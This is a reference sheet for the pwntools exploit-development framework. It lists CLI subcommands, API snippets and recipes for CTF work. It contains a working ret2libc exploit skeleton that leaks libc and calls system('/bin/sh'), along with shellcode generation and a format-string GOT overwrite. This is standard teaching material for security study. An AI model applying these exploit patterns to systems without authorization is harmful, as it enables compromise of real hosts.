# pwntools — exploit development framework

- **Version:** 4.15.0
- **Binary:** `/usr/local/bin/pwn` (CLI) and the `pwnlib` Python library
- **Full help snapshot:** [`help.txt`](help.txt)
- **Docs:** https://docs.pwntools.com/en/stable/
- **Source:** https://github.com/Gallopsled/pwntools

> **Deep-research scenarios:** [`SCENARIOS.md`](SCENARIOS.md)

## What it does

pwntools is a Python framework for CTF and exploit development. It provides
process/remote tubes, ELF parsing, ROP chain building, shellcode assembly,
format-string helpers, cyclic patterns, GDB integration, and a CLI toolbox (`pwn`).

## Use cases

| Task | API |
|------|-----|
| Interact with a process/remote service | `process()`, `remote()` |
| Parse ELF symbols/PLT/GOT | `ELF()` |
| Build ROP chains | `ROP()` |
| Assemble/disassemble | `asm()`, `disasm()`, `shellcraft` |
| Find offsets | `cyclic()`, `cyclic_find()` |
| Format-string exploitation | `fmtstr_payload()` |
| Debug with GDB | `gdb.attach()` |
| Check binary hardening | `checksec` / `ELF.checksec()` |
| Patch/modify binaries | `ELF.patch()`, `elfpatch` |
| Generate exploit templates | `pwn template` |

## CLI reference

```bash
pwn <subcommand>
```

| Subcommand | Purpose |
|------------|---------|
| `asm` | Assemble shellcode/instructions |
| `checksec` | Show binary mitigations |
| `constgrep` | Search constants (syscalls, errno, etc.) |
| `cyclic` | Generate De Bruijn pattern |
| `debug` | Debug a binary in GDB |
| `disasm` | Disassemble bytes |
| `disablenx` | Patch NX off (CTF binaries) |
| `elfdiff` | Compare two ELFs |
| `elfpatch` | Patch an ELF |
| `errno` | Look up errno values |
| `hex` | Hex encode/decode |
| `libcdb` | Look up libc by build ID/symbols |
| `phd` | Parallel hex dump |
| `pwnstrip` | Strip data from binaries |
| `scramble` | Scramble bytes |
| `shellcraft` | Generate shellcode |
| `template` | Generate an exploit script |
| `unhex` | Hex decode |
| `update` | Update pwntools |
| `version` | Version |

## Core Python API

### Tubes

```python
from pwn import *

# Local process
p = process('./vuln')

# Remote service
p = remote('target.example.com', 1337)

# Send/receive
p.sendline(b'hello')
p.send(b'raw')
print(p.recvline())
print(p.recvuntil(b'>>> '))
print(p.recvrepeat(1))
p.interactive()

# Packing
p64(0xdeadbeef)      # 8-byte little-endian
p32(0xdeadbeef)      # 4-byte little-endian
u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00')
```

### ELF

```python
e = ELF('./vuln')
print(e.checksec())
print(hex(e.symbols['main']))
print(hex(e.plt['puts']))
print(hex(e.got['puts']))
e.patch(0x1234, b'\x90\x90')
```

### ROP

```python
rop = ROP(e)
rop.call('puts', [e.got['puts']])
rop.call('main')
payload = flat({72: rop.chain()})
```

### Shellcraft / asm

```python
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
# or: shellcraft.amd64.linux.sh()
```

### Cyclic offsets

```bash
pwn cyclic 200
pwn cyclic -l 0x6161616c
```

```python
cyclic(200)
cyclic_find(0x6161616c)
```

### Format strings

```python
payload = fmtstr_payload(offset, {e.got['printf']: e.plt['system']})
```

### GDB

```python
gdb.attach(p, gdbscript='''
b *main+42
continue
''')
```

### Logging / context

```python
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.binary = './vuln'
```

## Recipes

```bash
# Check hardening
pwn checksec ./vuln

# Assemble
pwn asm 'mov rax, 60; xor rdi, rdi; syscall'

# Disassemble hex
pwn disasm '4831c0c3'

# Find offset
pwn cyclic 300 > pattern.txt
pwn cyclic -l 0x6161616c

# Shellcode
pwn shellcraft amd64.linux.sh
pwn shellcraft -f c amd64.linux.execve '/bin/sh'

# Generate exploit template
pwn template ./vuln --host target.example.com --port 1337 > exploit.py
```

Typical exploit skeleton:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('target.example.com', 1337)
    return process(elf.path)

p = start()

# 1. Leak
payload = flat({72: elf.plt['puts'], 80: elf.symbols['main'], 88: elf.got['puts']})
p.sendlineafter(b'> ', payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'puts leak: {hex(leak)}')

# 2. Compute base with libc database
libc = ELF('./libc.so.6')
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# 3. Second stage
rop = ROP(libc)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
p.sendlineafter(b'> ', flat({72: rop.chain()}))
p.interactive()
```

## Gotchas

- `pwn` CLI and library are the same install; import as `pwn` (not `pwntools`).
- `context.binary` auto-sets arch/OS and enables `elf` shortcuts.
- `flat()` with a dict is offset→value; use it instead of manual padding.
- `gdb.attach()` needs a terminal and GDB; in containers use `gdb.debug()`.
- ROP gadget availability depends on the binary/libs; check `rop.gadgets`.
- `p64`/`p32` are little-endian by default; set `context.endian` if needed.
- Remote libc differs from local; leak and identify it (`libcdb`, `one_gadget`).
- Only use against systems you own or are authorized to test.

## References

- Docs: https://docs.pwntools.com/en/stable/
- Tutorials: https://github.com/Gallopsled/pwntools-write-ups
- Source: https://github.com/Gallopsled/pwntools
- libc database: https://libc.rip/
